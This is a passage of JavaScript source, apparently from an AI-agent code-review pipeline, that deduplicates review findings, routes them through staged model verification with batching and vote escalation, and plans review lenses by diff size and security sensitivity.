  log(`[${profile.id}] Roll-up: ${g.length}× ${rep.ruleId} from '${rep.source}' → ${keep.length} individual + 1 grouped`)
  return rolled
}


/** The model's same-defect groups over the listed pool, or null when the pass failed (logged). @param {Profile} profile @param {string} listing */
async function dedupModelGroups(profile, listing) {
  let res = null
  try {
    res = await ragent(
      `You are deduplicating code-review findings BEFORE verification. Different lenses word the same defect differently. Group ONLY findings that describe the SAME underlying defect — same root cause, where one edit fixes all of them (e.g. one redundant loop reported by both a performance and an idioms lens). Same file+line alone is NOT enough: two distinct defects can share a line. When in doubt, do NOT group.

FINDINGS:
${listing}

Return {groups: [[i, j, ...], ...]} — index groups of same-defect findings; omit singletons; {groups: []} if all are distinct.`,
      { label: `dedup:${profile.id}`, phase: 'Verify', schema: DEDUP_SCHEMA, model: 'haiku', effort: 'low' },
    )
  } catch (e) {
    log(`[${profile.id}] dedup pass failed (${String((e && /** @type {{ message?: unknown }} */ (e).message) || e).slice(0, 80)}) — verifying the raw pool`)
  }
  return res
}

/** One same-defect group merged onto its strictest member. @param {Finding[]} members @param {(f: Finding) => boolean} isToolSrc @returns {Finding} */
function mergedGroup(members, isToolSrc) {
  // Base = the strictest member: tool-sourced first (a tool finding can only be refuted by
  // re-running the tool), then highest severity.
  const base = /** @type {Finding} */ (members.slice().sort((a, b) => (/** @type {number} */ (/** @type {unknown} */ (isToolSrc(b))) - /** @type {number} */ (/** @type {unknown} */ (isToolSrc(a)))) || ((SEV_RANK[a['severity'] ?? ''] ?? 9) - (SEV_RANK[b['severity'] ?? ''] ?? 9)))[0])
  const others = members.filter(m => m !== base)
  // A floored member keeps the group at Medium even when a lower tool-sourced finding is the base,
  // with the floor's note. Only the floor lifts: any other higher member leaves the base as it was,
  // because a tool base is refuted only by re-running the tool and must not carry a lens's claim.
  const sevOf = (/** @type {Finding} */ m) => SEV_RANK[m['severity'] ?? ''] ?? 9
  const floored = members.find(m => pathFloorNote(m['why']) !== '' && sevOf(m) < sevOf(base))
  const lifted = floored && sevOf(base) > (SEV_RANK['Medium'] ?? 2) ? { severity: 'Medium', why: `${base['why']}${pathFloorNote(floored['why'])}` } : {}
  // Carry ALL contributing sources so a downstream source-keyed rule (strict maintainability
  // escalation) still fires when its trigger lens was merged into a different-source base.
  const sources = [...new Set(members.map(m => m['source']).filter(Boolean))]
  // Union the off-site evidence too: a merged-away member may have pinned the premise the base
  // only asserted, and dropping it would cost the group its Confirmed tier at verification.
  const whereChecked = [...new Set(members.map(m => m['whereChecked']).filter(Boolean))].join('; ')
  const merged = { ...base, ...lifted }
  return withEarliestRound({ ...merged, sources, whereChecked, why: `${merged['why']} (same defect also reported by: ${others.map(m => m['source']).join(', ')})` }, members)
}

/** @param {Finding[]} pool @param {Profile} profile */
async function dedupPool(pool, profile) {
  if (pool.length < 2) return pool
  const isToolSrc = (/** @type {Finding} */ f) => isToolSource(f['source'])
  const listing = pool.map((/** @type {Finding} */ f, /** @type {number} */ i) => `${i}. ${f['file'] || '?'}:${f['line'] || 0} [${f['severity']}] (${f['source']}) ${f['title']} — ${String(f['why'] || '').slice(0, 160)}`).join('\n')
  const res = await dedupModelGroups(profile, listing)
  // Deterministic same-spot groups go FIRST: the "overlapping groups: first wins" rule below then
  // makes them authoritative over a model group that would have split the same indices differently.
  const detGroups = sameSpotGroups(pool)
  const groups = detGroups.concat(
    (res?.groups ?? []).filter(g => Array.isArray(g) && g.length > 1 && g.every(i => Number.isInteger(i) && i >= 0 && i < pool.length))
      // Nor may the model merge them (realm @nick/craft, node #238).
      .filter(g => !holdsToolDistinct(g.map((/** @type {number} */ i) => /** @type {Finding} */ (pool[i])))),
  )
  /** @type {Finding[]} */
  const merged = []
  /** @type {Set<number>} */
  const inGroup = new Set()
  for (const g of groups) {
    if (g.some(i => inGroup.has(i))) continue // overlapping groups: first wins
    for (const i of g) inGroup.add(i)
    merged.push(mergedGroup(g.map((/** @type {number} */ i) => /** @type {Finding} */ (pool[i])), isToolSrc))
  }
  if (!merged.length) return pool
  const foldedPool = pool.filter((/** @type {Finding} */ _f, /** @type {number} */ i) => !inGroup.has(i)).concat(merged)
  const detFolded = detGroups.reduce((n, g) => n + g.length - 1, 0)
  log(`[${profile.id}] Dedup before verify: ${pool.length} → ${foldedPool.length} (${pool.length - foldedPool.length} cross-lens duplicate(s) merged — ${detFolded} of them same-spot, caught deterministically)`)
  return foldedPool
}

// Verify a pool of findings → {confirmed, suspected, dropped, refuted}. Rigor scales with the profile's plan.
// Staged verification: cull votes run on a cheap model (sonnet); a High/Critical additionally gets exactly
// ONE authoritative opus vote, so the cheap model can neither confirm nor drop a high-stakes finding alone.
const CULL_MODEL = 'sonnet'

// ---- verification dispatch bounding ----
// Pure helpers, tested as a real module in lib/review-waves.mjs.

// ---- the same reasoning, carried to the tier where the money is ----
// `verifyTier` skips Low/Info because no judgement on them can move the verdict. That is a statement
// about `reviewVerdict`, not about severity — and once a Critical or High is CONFIRMED the verdict is
// Block, at which point every Medium is verdict-neutral too. Medium is the whole batched population.
// Pure helpers, tested as a real module in lib/verify-economy.mjs; the order discipline that makes this
// legitimate lives there.

// THE DEATH CLASS of a batch answer, or null when the verifier really did judge something. The
// three classes are kept APART rather than collapsed into one boolean: they are three distinct ways
// the answer can fail to arrive, and a single message for all of them makes a test that scripts one
// of them pass while the other two are unreached — the "neighbouring door" failure the death table
// below exists to prevent. Each class names itself in the finding's `why`, so a row of that table
// proves which branch it reached.
/** @param {unknown} res  the batch verifier's answer, which may be off-schema (see VOTE_AXES) */
function batchDeath(res) {
  if (!res) return 'returned nothing at all — a dead agent, an exhausted retry, or an expired deadline'
  const verdicts = /** @type {{ verdicts?: unknown }} */ (res).verdicts
  if (!Array.isArray(verdicts)) return 'answered OFF-SCHEMA — its answer carried no verdict list at all'
  if (!/** @type {unknown[]} */ (verdicts).length) return 'answered with an EMPTY verdict list — it judged nothing'
  return null
}


/** @type {Schema<BatchVerdictAnswer>} */
const BATCH_VERDICT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['verdicts'],
  properties: {
    verdicts: {
      type: 'array',
      description: 'one entry per finding in the batch, keyed by its index — every index must appear',
      items: {
        type: 'object',
        additionalProperties: false,
        required: ['index', 'refuted', 'citedLineMatches', 'reachable', 'premiseSupported', 'reason'],
        properties: {
          index: { type: 'integer' },
          refuted: { type: 'boolean' },
          citedLineMatches: { type: 'boolean' },
          reachable: { type: 'boolean' },
          premiseSupported: { type: 'boolean' },
          reason: { type: 'string' },
        },
      },
    },
  },
}
/** @param {Finding[]} items @param {Plan} plan @param {Profile} profile @param {string} gateProvenance */
async function verifyPool(items, plan, profile, gateProvenance) {
  // One breaker per verification pass, handed only to the dispatches this function windows. Its
  // lifetime is the pass: a profile's pass never inherits a window filled by another profile's,
  // whose API reachability it did not observe and whose deaths it cannot re-spend.
  const breaker = makeDeathBreaker()
  /** @type {{ individual: Finding[], batch: Finding[], skip: Finding[] }} */
  const route = { individual: [], batch: [], skip: [] }
  for (const f of items) route[/** @type {keyof typeof route} */ (depthVerifyTier(verifyTier(f), f['severity'], reviewDepth))].push(f)

  // What is ALREADY confirmed at a blocking severity, raised as the individual panel settles. A
  // batch thunk asks it at the moment it is about to dispatch, so the skip below can only ever rest
  // on evidence that has already come back — never on an expectation that a Critical will confirm.
  const floor = makeVerdictFloor()

  // Skipped tier: its OWN tier, `unverified` — not Suspected. Suspected means "a verifier looked and
  // the claim did not stand up confidently"; these were never looked at. Folding them into Suspected
  // made the two indistinguishable in the report AND put them in the refuteRate denominator, so a run
  // whose findings were mostly Low/Info reported a refutation rate diluted by items nothing refuted.
  /** @type {Finding[]} */
  const routedUnverified = route.skip.map(f => ({
    ...f,
    tier: 'unverified',
    why: lightPass ? `${f['why']} (NOT VERIFIED: ${lightUnverifiedWhy(f['severity'])})` : `${f['why']} (NOT VERIFIED: no verifier was spent on it — ${f['severity']} cannot change the verdict either way, so nothing here has been checked against the code)`,
  }))

  // Batched tier: group by file so one agent reads one file's context once.
  /** @type {Map<string, Finding[]>} */
  const byFile = new Map()
  for (const f of route.batch) {
    const k = f['file'] || '?'
    const at = byFile.get(k)
    if (at) at.push(f)
    else byFile.set(k, [f])
  }
  /** @type {Finding[][]} */
  const groups = []
  for (const [, fs] of byFile) for (let i = 0; i < fs.length; i += BATCH_SIZE) groups.push(fs.slice(i, i + BATCH_SIZE))

  // `notRun` is computed AFTER the window settles, from the findings that carry the unverified tier
  // — not pushed from inside one death branch. That placement is the fix: a list filled by whichever
  // branch remembered to push is exactly how the dominant death (a `null` answer) stayed out of the
  // verdict while the `.catch` branch was covered. Deriving it from the tier makes it impossible for
  // a new death path to reach the report as an inspection.
  // A whole group nothing judged, whatever killed it. The reason is a CLASS of death, not the
  // verbatim error text: the run record's `notRun` is ranked by exact string to surface repeated
  // fragility, and an error message (or a run-specific path) makes every entry unique and sinks the
  // real repeats — the same reason `uncoveredFiles` is ranked separately.
  const deadGroup = (/** @type {Finding[]} */ group, /** @type {string} */ why) => {
    const what = `the batch verifier for ${/** @type {Finding} */ (group[0])['file'] || '?'} ${why}`
    log(`⚠️ [${profile.id}] ${what} — its ${group.length} finding(s) were NOT checked against the code; reported as unverified and excluded from the verification counters`)
    return group.map((/** @type {Finding} */ f) => NOT_VERIFIED(f, `${what}, so nothing checked this finding against the code`))
  }

  // Batched and individual verification look at DISJOINT findings — routing put each one in exactly
  // one bucket — so awaiting the batch wave before starting the individual one bought nothing but
  // latency. Measured on one run: batches ran +81..89min and individuals +89..102min, strictly
  // nose-to-tail. They are built as two thunk lists sharing ONE ordered work list, so the slowest
  // batch no longer holds up the first verifier — but that list is dispatched through a BOUNDED
  // SLIDING WINDOW rather than all at once, because the per-agent deadline is measured from DISPATCH
  // and an unbounded fan-out makes it fire on queue wait instead of on hanging. A window, not waves:
  // waves gave the same cap but re-introduced a barrier per wave (see VERIFY_WINDOW_AGENTS).
  // A group whose verifier was never bought because the verdict was already fixed at Block. It takes
  // the same route as a death AS FAR AS THE TIERS GO — the unverified tier, out of the refutation
  // denominator — and for the same reason: nothing here was checked against the code. What it does
  // NOT do is disappear, and what it does NOT do either is enter `notRun`: that list means "this ran
  // badly; re-run it" and drives the INCOMPLETE marker, while this is a deliberate saving a re-run
  // would simply make again. It travels in `savedByFloor` instead (see the return of verifyPool),
  // and converts into `notRun` only if the Block it was justified by fails to arrive.
  // `verifySkipped` is the flag that keeps the two apart, since they need a re-run for opposite
  // reasons.
  const floorSkippedGroup = (/** @type {Finding[]} */ group) => {
    log(`💰 [${profile.id}] the batch verifier for ${/** @type {Finding} */ (group[0])['file'] || '?'} was NOT dispatched — ${floorSkipReason(floor)}; its ${group.length} finding(s) are reported as unverified and excluded from the verification counters`)
    return group.map((/** @type {Finding} */ f) => ({ ...NOT_VERIFIED(f, floorSkipReason(floor)), verifySkipped: true }))
  }

  const batchThunks = groups.map(group => () =>
    // Asked HERE, inside the thunk, not when the thunk list is built: the window dispatches lazily
    // and the individual panel goes first, so by the time a batch's turn comes the floor may have
    // been raised by a Critical that has actually come back confirmed. Asked at build time it would
    // always answer no, and the whole population would be bought.
    (verdictNeutralNow(group[0], floor)
      ? Promise.resolve(floorSkippedGroup(group))
      : ragent(batchVerifyPrompt(group, profile), { label: `verify-batch:${/** @type {Finding} */ (group[0])['file'] || '?'}(${group.length})`, phase: 'Verify', breaker, schema: BATCH_VERDICT_SCHEMA, model: CULL_MODEL })
      .then(res => {
        // THE DISCRIMINATOR. `ragent` answers `null` for a dead agent (API error, skip, or the
        // per-agent deadline) after its one re-dispatch, and that is the DOMINANT death — not the
        // throw the `.catch` below handles. An answer carrying no verdicts at all is the same
        // outcome by a different route: nothing was judged. Either way the group is unverified.
        const death = batchDeath(res)
        if (death) return deadGroup(group, death)
        return group.map((/** @type {Finding} */ f, /** @type {number} */ i) => {
          // `death` is null only for an answer carrying a non-empty verdict list, so `res` is set here.
          const v = (res?.verdicts ?? []).find(x => x && x['index'] === i)
          // A missing index in a NON-EMPTY verdict list is a verifier that ran and lost one finding —
          // an inspection happened, so this keeps `suspected`. This is the one case that must NOT be
          // folded into the unverified tier, and the only thing that separates it from a death.
          return v ? tierFromVotes(f, [v]) : { ...f, tier: 'suspected', why: `${f['why']} (batch verifier returned no verdict for this finding)` }
        })
      })
      // A batch verifier that THREW — both `ragent` attempts failed — judged nothing, so its group
      // belongs in `unverified`, exactly where the skipped Low/Info go, and by the same reasoning:
      // `suspected` is a claim that a verifier LOOKED and could not confirm, and the report now says
      // so in those words. Marking a dead verifier's findings suspected made the report assert an
      // inspection that never happened, and left up to BATCH_SIZE findings inside the `totalVerified`
      // denominator that is defined as what verification actually judged. One tier, one way in.
      // The verbatim error text is deliberately NOT carried into the finding or into `notRun`: see
      // the note on `deadGroup`. It is logged instead, where a unique string costs nothing.
      .catch((/** @type {unknown} */ err) => {
        log(`⚠️ [${profile.id}] batch verifier threw: ${String((err && /** @type {{ message?: unknown }} */ (err).message) || err).slice(0, 160)}`)
        return deadGroup(group, 'died before returning any verdict')
      })))

  if (route.skip.length || groups.length) {
    log(`[${profile.id}] Verify routing: ${route.individual.length} individual · ${route.batch.length} batched into ${groups.length} agent(s) · ${route.skip.length} NOT VERIFIED (Low/Info cannot move the verdict; reported as unverified, excluded from the verification counters)`)
  }

  const individualThunks = route.individual.map(f => () => {
    // A gate tool's seed (clippy-pedantic, statix, deadnix, semgrep, …) is deterministic and re-runnable, so a verifier refutes it only by re-running the tool; dep-context, a reasoning seed, is verified by argument like a lens finding (isToolSource, lib/prior-decision-match.mjs).
    const isTool = isToolSource(f['source'])
    const isHigh = f['severity'] === 'Critical' || f['severity'] === 'High'
    const n1 = isHigh ? Math.max(1, plan.verifyVotes) : 1
    // Cull votes on the cheap model.
    const cull = (/** @type {number} */ i) => () =>
      ragent(verifyPrompt(f, i, isTool, gateProvenance, profile), { label: `verify:${f['file'] || '?'}:${f['line'] || 0}#c${i + 1}`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: CULL_MODEL })
    if (!isHigh) return parallel([cull(0)]).then(vs => tierFromVotes(f, vs))
    // A High/Critical always gets exactly one authoritative opus vote combined with the cull votes.
    const auth = () =>
      ragent(verifyPrompt(f, n1, isTool, gateProvenance, profile), { label: `verify:${f['file'] || '?'}:${f['line'] || 0}#auth`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: plan.lensModel })
    // Open with the DECIDING pair — one cheap cull plus the authoritative vote — and buy the remaining
    // cull votes only when those two disagree. tierFromVotes is a majority rule, so a unanimous pair
    // lands on exactly the tier a unanimous four would: the extra votes only ever change the outcome
    // when there is a split to break. Measured justification: on a security-sensitive Rust diff
    // verifyVotes is forced to 3, so every High cost 4 agents — 72 of one run's 137 — while the whole
    // verification pass refuted 3% of candidates. Nearly all of those votes were re-confirming an
    // already-unanimous verdict. When they DO split, the escalation restores the full n1+1 panel, so
    // no contested finding is decided on thinner evidence than before.
    return parallel([cull(0), auth]).then(async vs => {
      const opening = vs.filter(Boolean)
      if (opening.length === 2 && votesAgree(opening[0], opening[1])) return tierFromVotes(f, opening)
      const rest = await parallel(Array.from({ length: Math.max(0, n1 - 1) }, (/** @type {unknown} */ _unused, /** @type {number} */ i) => cull(i + 1)))
      return tierFromVotes(f, opening.concat(rest.filter(Boolean)))
    })
  })
  // A batch thunk resolves to an ARRAY of judged findings (one per finding in the group), an
  // individual thunk to a single one — flatten the batch side back out before merging. The window
  // settles out of order but writes each result at ITS OWN index, so the positional split below
  // stays exactly as valid as it was under one parallel().
  //
  // INDIVIDUALS LEAD, and that ordering is the load-bearing part of the Medium economy above. The
  // window still has no barrier — the two tiers overlap freely — but it dispatches in list order, so
  // the Critical/High panel that can raise the verdict floor goes out first and a batch's turn comes
  // after some of it has come back. Batches first would ask the floor before anything could have
  // raised it, and the answer would always be "not yet".
  // Every settled individual verdict is offered to the floor. Wrapped here rather than inside the
  // thunk because the thunk has two return points, and a floor raised on one path but not the other
  // is the kind of half-wiring that leaves the saving silently unrealized.
  // `run` is `individualThunks[i]` for an in-range `i` (both lists map `route.individual`), hence the
  // cast; the result is typed as a window entry's so the batch thunks concatenate onto the same list.
  /** @type {(run: (() => Promise<Finding>) | undefined) => () => Promise<Finding | Finding[]>} */
  const withFloor = run => () => Promise.resolve(/** @type {() => Promise<Finding>} */ (run)()).then(r => {
    if (floor.record(r)) log(`💰 [${profile.id}] the verdict is now fixed at Block by a confirmed ${r.severity} (${r.file || '?'}:${r.line || 0}) — Medium batches not yet dispatched can no longer move it and will not be bought`)
    return r
  })
  const entries = route.individual.map((f, i) => ({ run: withFloor(individualThunks[i]), weight: verifyWeight(f, plan) }))
    .concat(batchThunks.map(run => ({ run, weight: 1 })))
  const totalWeight = entries.reduce((n, e) => n + e.weight, 0)
  if (totalWeight > VERIFY_WINDOW_AGENTS) {
    log(`[${profile.id}] Verify dispatched through a sliding window of ≤${VERIFY_WINDOW_AGENTS} agents (${totalWeight} worst-case agents queued) — a deeper queue makes the per-agent deadline fire on waiting rather than on hanging; the window refills as each verifier settles, so nothing waits on a batch's slowest member`)
  }
  // parallel([run]) per entry, not one parallel() over all of them: it is the sandbox primitive that
  // turns a throwing thunk into null, and a single-thunk barrier is no barrier at all.
  const settledVerdicts = await weightedWindow(entries, VERIFY_WINDOW_AGENTS, run => parallel([run]).then(rs => rs[0]))
  // Death #6: `weightedWindow` writes `null` at an entry's own index when its promise rejected, and
  // `.filter(Boolean)` used to DELETE those findings outright — out of every tier, out of the
  // denominator AND out of `notRun`, so the report simply never mentioned them. A null is recovered
  // back into its own findings by index (the batch side knows its group, the individual side its
  // finding) and routed exactly like every other death.
  const judged = settledVerdicts.slice(0, route.individual.length)
    // The first `route.individual.length` entries are individual thunks, each settling to ONE finding.
    .map((r, i) => (/** @type {Finding | null | undefined} */ (r) || NOT_VERIFIED(/** @type {Finding} */ (route.individual[i]), 'the verifier panel for this finding was lost before it settled — nothing was checked against the code')))
  const batched = settledVerdicts.slice(route.individual.length)
    // ...and the rest are batch thunks, each settling to its group's judged findings.
    .flatMap((r, i) => (r ? /** @type {Finding[]} */ (r) : deadGroup(/** @type {Finding[]} */ (groups[i]), 'was lost before it settled (its dispatch never produced a result)')))
  /** @type {Finding[]} */
  const settled = judged.concat(batched)
  // A dead batch's findings arrive through the same list as judged ones and must leave it again:
  // `vp` is the JUDGED population and every count derived from it (candidates, refuteRate) means
  // "what verification actually examined".
  const vp = settled.filter(f => f.tier !== 'unverified')
  const deaths = settled.filter(f => f.tier === 'unverified')
  const refuted = vp.filter(f => f.tier === 'refuted')
  return {
    confirmed: vp.filter(f => f.tier === 'confirmed'),
    suspected: vp.filter(f => f.tier === 'suspected'),
    // Kept OUT of `vp` on purpose, from both of its sources: the Low/Info nothing was spent on, and
    // the groups whose batch verifier died.
    unverified: routedUnverified.concat(deaths),
    // DERIVED from the tier, not pushed by whichever branch remembered to. Grouped by file and
    // ranked-friendly: one stable string per (profile, file), no error text, no run-specific path.
    // THE ONE THINNING THAT LEAVES NO TRACE. A refuted finding is deleted from the run — out of
    // every tier and out of the report — so when its panel was thinned, the partial evidence it was
    // deleted on is visible nowhere: no finding to carry the clause, no mark, and a verdict that
    // reads clean. `notRun` is the existing mechanism for "this ran badly; re-run it", and it drives
    // the INCOMPLETE marker. DERIVED from the tier plus the flag tierFromVotes sets, like the
    // deaths above, and grouped by (profile, file) so the exact-string ranking in
    // lib/analyze-runs.mjs sees a repeat rather than a run-unique row.
    notRun: [...new Set([
      // THREE failures, kept apart by the same discipline that keeps error text out of the strings.
      // This list is ranked by exact string across runs, so collapsing any two makes one repeat
      // masquerade as another and sends the repair to the wrong place. A death is fragility a re-run
      // can fix; an off-schema panel ANSWERED and must not be called a death; a thinned refutation
      // deleted a finding on partial evidence. The deliberate floor skip is NOT here — see
      // `savedByFloor` below for why it cannot be.
      // Split on the flags tierFromVotes and floorSkippedGroup set, not on the wording of any `why`.
      ...deaths.filter(f => !f.verifySkipped && !((f.votesDiscarded ?? 0) > 0)).map(f => `${profile.id} verification of ${f.file || '?'} — the verifier(s) died before returning a verdict, so those finding(s) were never checked against the code`),
      ...deaths.filter(f => !f.verifySkipped && (f.votesDiscarded ?? 0) > 0).map(f => `${profile.id} verification of ${f.file || '?'} — every returned vote answered OFF-SCHEMA and was discarded before the arithmetic, so those finding(s) were never checked against the code`),
      ...refuted.filter(f => (f.votesDiscarded || 0) > 0).map(f => `${profile.id} verification of ${f.file || '?'} — a finding was REFUTED and deleted from the run by a THINNED PANEL (at least one returned vote answered off-schema and was discarded), so the deletion rests on partial evidence`),
    ])],
    // OUT of `notRun` on purpose, and this is the same call that was already made once for
    // `uncoveredFiles`. `notRun` means "this ran badly; re-run it": it drives the INCOMPLETE marker
    // on the verdict line, and lib/analyze-runs.mjs ranks it by exact string to surface repeated
    // FRAGILITY. A floor skip is the opposite of fragility — it is a deliberate, reproducible
    // saving that a re-run will simply make again. Left inside, it would do two kinds of damage,
    // both of them silent: every Block run carrying a batched Medium (the ordinary case) would
    // render as "⚠️ INCOMPLETE — coverage was partial … findings may be undercounted", which is a
    // false statement about coverage and, through rust-audit's leading-⚠️ rule, can pull a whole
    // audit down to Warning; and this string would become the most frequent row in the fragility
    // ranking, sinking the genuine repeats the ranking exists to surface. The findings themselves
    // are not hidden by this: they stay in the `unverified` tier, out of the refutation
    // denominator, and each carries its own `why` into the report's Unverified section.
    // Read across runs by lib/analyze-runs.mjs, which ranks it separately from the failures.
    savedByFloor: [...new Set(deaths.filter(f => f.verifySkipped).map(f => `${profile.id} verification of ${f.file || '?'} — deliberately not dispatched: the verdict was already fixed at Block, and no judgement on a Medium can move it, so those finding(s) were never checked against the code`))],
    dropped: refuted.length,
    refuted,
  }
}

// Rigor is a function of the size bucket, not a model's opinion: the scout classifies (sizeBucket,
// lenses, securitySensitive, …) and the script budgets. `lensModel` is a constant — review reasoning
// runs on Opus at every size; depth scales via rounds, votes and lens count.
const RIGOR_BY_SIZE = {
  small: { maxRounds: 1, verifyVotes: 1 },
  medium: { maxRounds: 2, verifyVotes: 1 },
  large: { maxRounds: 3, verifyVotes: 3 },
}
const LENS_MODEL = 'opus'

// ---- the per-profile plan: the scout's classification, then every floor and gate, in this order ----
// Lenses a BLANKET expansion of the roster must not include. A lens is a full agent — the
// dominant per-run cost — and `failure-windows` is the heaviest in the Rust roster: it enumerates
// every mutating request on the changed path and plays out each adjacent pair. Its premise is a
// code shape (a controller / reconcile loop), and its gate is the `reconciler` lens below. But it
// also sits in `profile.lenses`, so every blanket fill of that list — the security-sensitive
// rigor floor, the empty-lens fallback, and the conservative plan used when the scout DIED —
// bought it on any Rust diff at all, which is the opposite of "find more without paying hugely".
// A blanket fill is a statement of IGNORANCE about the diff, and ignorance is not this lens's
// signal. The scout may still pick it deliberately; only the floors may not.
// `admittedLens` is the ONE gate the optional set passes through, and it must sit under EVERY path
// into the plan — the scout's own picks, the blanket fills, and therefore the security floor and
// the empty-lens fallback that call `blanketLenses()`. There is a fourth path, far later and easy to
// miss: the completeness critic on the synthesis phase, which composes from the lenses NOT
// selected — by construction the whole optional set. It went ungated once and bought two of the
// three on an ordinary large diff. It calls `admittedLens` too now; putting the gate anywhere but
// under each of these leaves a door, because every one of them names lenses on its own signals.
/** Whether a lens may enter the plan at all: the optional set only by an explicit request. @param {string} l */
function admittedLens(l) {
  return !OPTIONAL_LENSES.includes(l) || optionalRequested.includes(l)
}

/** The profile's roster as a blanket fill takes it: no conditional lens, nothing unrequested. @param {Profile} profile @returns {string[]} */
function blanketLenses(profile) {
  return profile.lenses.filter((/** @type {string} */ l) => !CONDITIONAL_LENSES.includes(l) && admittedLens(l))
}

/** @param {ScoutAnswer | null} scout @returns {keyof typeof RIGOR_BY_SIZE} */
function rigorSize(scout) {
  // hasOwn, not truthiness: a bucket of "constructor" would index Object.prototype and pass.
  return /** @type {keyof typeof RIGOR_BY_SIZE} */ (Object.hasOwn(RIGOR_BY_SIZE, scout?.sizeBucket ?? '') ? scout?.sizeBucket : 'medium')
}

/** The lenses the scout picked that the roster has and the gate admits; a blanket fill when it picked none. @param {Profile} profile @param {ScoutAnswer | null} scout @returns {string[]} */
function scoutPickedLenses(profile, scout) {
  return scout?.lenses?.length ? scout.lenses.filter((/** @type {string} */ l) => profile.lenses.includes(l) && admittedLens(l)) : blanketLenses(profile)
}

/** @param {Profile} profile @param {ScoutAnswer | null} scout @param {keyof typeof RIGOR_BY_SIZE} size @returns {Plan} */
function initialPlan(profile, scout, size) {
  return {
    sizeBucket: size,
    lenses: scoutPickedLenses(profile, scout),
    maxRounds: RIGOR_BY_SIZE[size].maxRounds,
    verifyVotes: RIGOR_BY_SIZE[size].verifyVotes,
    lensModel: LENS_MODEL,
    isLibrary: profile.usesLibrary ? (scout?.isLibrary ?? false) : false,
    securitySensitive: scout?.securitySensitive ?? true,
    intent: scout?.intent ?? intentArg,
    spec,
    churn: scout?.churn ?? [],
  }
}

/** Adds a lens the plan lacks. @param {Plan} plan @param {string} l */
function addMissingLens(plan, l) {
  if (!plan.lenses.includes(l)) plan.lenses.push(l)
}

/** Adds a lens the plan lacks, if the profile's roster offers it. @param {Profile} profile @param {Plan} plan @param {string} l */
function addOfferedLens(profile, plan, l) {
  if (profile.lenses.includes(l)) addMissingLens(plan, l)
}

/** The lenses the plan must carry whatever the scout picked: the always set, and those the scout's own signals call for. @param {Profile} profile @param {ScoutAnswer | null} scout @param {Plan} plan */
function addRequiredLenses(profile, scout, plan) {
  // "Always" lenses are enforced HERE, not left to the scout: smoke runs showed prompt-side
  // "always include X" gets dropped. 'intent' is the lens that catches correct-looking code
  // with wrong behavior — it runs at every size.
  for (const l of (profile.alwaysLenses || [])) addOfferedLens(profile, plan, l)
  // `tests` is enforced the same way on a change to production code (lib/test-paths.mjs): a code change
  // with no test beside it is exactly where a missing or hollow test matters most, and the scout's
  // rule only fires on changed tests. A test-only or docs-only diff still leaves it to the scout.
  if (changesProductionCode(changedFiles, profile.diffGlobs)) addOfferedLens(profile, plan, 'tests')
  // `reconciler` in the plan IS the signal that this is controller code, and controller code is
  // where the windows between two committed writes live. Enforced here rather than in the scout
  // prompt for the same measured reason as the alwaysLenses loop above: a prompt-side "also include"
  // gets dropped, and a lens that silently did not run renders as a clean pass.
  // The signal is the SCOUT having chosen `reconciler` after reading the diff — not `reconciler`
  // merely being present in the plan. A blanket fill puts it there on every Rust diff, so reading
  // the plan let the floors back in through the gate's own door: the check passed, and the
  // conditional lens was conditional on nothing.
  if (scoutChoseReconciler(scout)) addOfferedLens(profile, plan, 'failure-windows')
  if (strict) addOfferedLens(profile, plan, 'maintainability')
}

/** Whether the scout, having read the diff, chose `reconciler`: the controller-code signal. @param {ScoutAnswer | null} scout */
function scoutChoseReconciler(scout) {
  return Array.isArray(scout?.lenses) && scout.lenses.includes('reconciler')
}

/** The rigor floors: security, the size-driven lenses, and an explicit optional request. @param {Profile} profile @param {Plan} plan */
function addRigorFloors(profile, plan) {
  // Security-sensitive rigor floor: don't let the size heuristic gate rigor on a security-touching change.
  if (plan.securitySensitive) applySecurityFloor(profile, plan)
  // Negative-space lens where new reachable surface tends to appear.
  if (plan.securitySensitive || plan.sizeBucket === 'large') addMissingLens(plan, 'negative-space')
  // Compat lens on large diffs too: changed serialized/persisted representations break other-versioned
  // readers (rolling deploy, already-stored rows) invisibly to the code-intrinsic lenses. Security-sensitive
  // diffs already get it via the all-lenses floor above (compat ∈ profile.lenses).
  if (plan.sizeBucket === 'large') addOfferedLens(profile, plan, 'compat')
  // A changed contract path (lib/contract-paths.mjs) ADDS compat at every size: a chart, CRD, IDL,
  // migration or plugin manifest is deployed or called against by other versions whatever the diff's
  // size, and the surface gate below then keeps it, since the same paths force `wireForm` on.
  if (changedFiles.some(isContractOrSchemaPath)) addOfferedLens(profile, plan, 'compat')
  // An explicit request ADDS the lens; it does not merely permit it. A caller who writes
  // `optional=performance` is asking for the performance pass to RUN, not for the scout to be
  // allowed to pick it — and on a small diff with no security floor nothing else would ever put it
  // in the plan, so "permit" would have meant "nothing happens". Enforced in code, for the same
  // measured reason as the alwaysLenses loop above.
  for (const l of optionalRequested) addOfferedLens(profile, plan, l)
}

/** @param {Profile} profile @param {Plan} plan */
function applySecurityFloor(profile, plan) {
  for (const l of blanketLenses(profile)) addMissingLens(plan, l)
  plan.verifyVotes = Math.max(plan.verifyVotes, 3)
  plan.maxRounds = Math.max(plan.maxRounds, 2)
}

/** Drops each surface-gated lens whose surface the scout said is absent; returns what it dropped. @param {ScoutAnswer | null} scout @param {Plan} plan @returns {string[]} */
function applySurfaceGate(scout, plan) {
  // realm @nick/craft #102: surface gate — the LAST word on plan.lenses, sitting AFTER every floor
  // that can add negative-space/compat/invariants (the scout's picks, the security/large floors, the
  // optional request above). Each of those three fires only where the diff touches the surface its
  // defect class needs; here that surface is read and the lens dropped only where the scout said the
  // surface is absent. FAIL-OPEN: an undefined or true surface KEEPS the lens.
  const surfaces = { ...(scout?.surfaces || {}) }
  // Certain cross-boundary paths the scout can miss force their surfaces ON — never off, so this only
  // ever adds a lens back, never removes one.
  if (changedFiles.some(isContractOrSchemaPath)) { surfaces.crossBoundarySymbol = true; surfaces.wireForm = true }
  /** @type {string[]} */
  const surfaceDropped = []
  plan.lenses = plan.lenses.filter(lens => {
    const need = SURFACE_GATED_LENSES[lens]
    if (!need) return true
    if (surfaces[need] === false) { surfaceDropped.push(lens); return false }
    return true // fail-open: undefined/true keeps the lens
  })
  return surfaceDropped
}

/** @param {Profile} profile @param {ScoutAnswer | null} scout @returns {{ plan: Plan, surfaceDropped: string[] }} */
function planFromScout(profile, scout) {
  const plan = initialPlan(profile, scout, rigorSize(scout))
